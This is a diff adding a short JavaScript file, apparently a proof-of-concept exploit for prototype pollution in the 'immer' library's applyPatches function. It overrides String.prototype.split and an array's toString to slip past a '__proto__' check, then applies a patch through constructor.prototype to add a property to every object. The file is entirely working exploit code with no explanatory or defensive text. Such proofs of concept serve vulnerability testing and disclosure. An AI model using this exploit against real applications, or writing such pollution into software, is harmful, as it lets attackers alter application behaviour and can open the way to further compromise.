@@ -1,0 +1,29 @@
+var arg = ['__proto__'];
+var flag1 = true;
+arg.toString = function () {
+    if (flag1) {
+        flag1 = false;
+        return 'foo';
+    } else {
+        return '__proto__';
+    }
+};
+String.prototype.split = function () {
+    return [
+        arg,
+        'polluted'
+    ];
+};
+console.log({}.polluted);
+const {applyPatches, enablePatches} = require('immer');
+enablePatches();
+applyPatches({}, [{
+        op: 'add',
+        path: [
+            'constructor',
+            'prototype',
+            'polluted'
+        ],
+        value: 'yes'
+    }]);
+console.log({}.polluted);
